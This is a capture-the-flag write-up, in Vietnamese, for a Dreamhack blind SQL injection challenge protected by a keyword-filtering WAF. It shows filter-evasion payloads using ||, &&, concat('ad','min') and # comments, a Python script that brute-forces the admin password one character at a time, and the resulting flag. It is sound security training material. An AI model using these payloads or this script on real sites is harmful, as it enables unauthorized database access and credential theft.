# Writeup `SQL Injection Bypass WAF`
> ## Exercise: SQL Injection Bypass WAF의 패치된 문제입니다
---
## Solution
### 1.
Khi vào trang web challenge, chúng ta thấy một ô input. Tuy nhiên, bài này khó hơn vì có một WAF (Tường lửa ứng dụng web).

WAF này lọc (chặn) rất nhiều từ khóa tấn công phổ biến, bao gồm:

- union, select, from

- and, or, (dấu cách)

- admin

- --, /* (dấu comment)

> #### -> Đây là lỗ hổng Blind SQLi, nhưng chúng ta phải lách (bypass) WAF.

### 2.
Từ file init.sql, chúng ta biết được nơi giấu của cờ (flag) (tương tự bài `sql_blindIA`):

- Bảng: `user`

- Hàng: Nơi có `uid` là `admin`

- Cột: `upw`

### 3.
Vì WAF chặn and, (dấu cách), và admin, chúng ta phải dùng payload đặc biệt để "lách":

- Dùng && (thay cho and).

- Dùng concat('ad','min') (để tạo ra chuỗi 'admin').

- Dùng # (thay cho -- để comment).

Payload tìm độ dài (ví dụ: độ dài 44):
```sql
'||uid=concat('ad','min')&&length(upw)=44#
```
Khi server trả về nội dung có chứa chữ "admin", đó là độ dài đúng.
 ### 4.
 Chúng ta không dùng `Binary Search` (vì `WAF` chặn logic so sánh) mà dùng `Brute-Force` (thử-sai) tuần tự.

Payload sẽ lặp qua từng vị trí và thử từng ký tự trong một "từ điển" (a,b,c...0,1,2...):
```sql
'||uid=concat('ad','min')&&substr(upw,{VỊ_TRÍ},1)='{KÝ_TỰ_ĐOÁN}'#
```
Script sẽ thử `...='a'#`, `...='b'#`, `...='c'#`,... Khi nào trang web trả về nội dung có chữ "admin" (tức là ĐÚNG), script sẽ lưu ký tự đó và chuyển sang vị trí tiếp theo.

Đoạn code:
```python
from requests import get
from bs4 import BeautifulSoup
from urllib.parse import quote

def extract_password_char_by_char(host):
    result = ""
    chars = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$%^&*()_+-={}[]|\\:;\"'<>,.?/~`"

    for position in range(1, 101):
        for char in chars:
            query = f"'||uid=concat('ad','min')&&substr(upw,{position},1)='{char}'#"
            encoded_query = quote(query)
            
            url = f"{host}?uid={encoded_query}"
            response = get(url)
            html_content = response.text
            soup = BeautifulSoup(html_content, 'html.parser')
            
            html_text = soup.get_text()
            if 'admin' in html_text:
                result += char
                print(f"password: {result}")
                break
        else:
            print(f"Failed to find character at position {position}")
            break
            
    print(f"final password: {result}")
    return result

host_url = "http://host8.dreamhack.games:19061/"
password = extract_password_char_by_char(host_url)
```
 ### Ra được Flag: `dh{d3def39496c4153942f3f7d5451a4b98c6db1664}`
 ### -> Flag chuẩn: `DH{d3def39496c4153942f3f7d5451a4b98c6db1664}`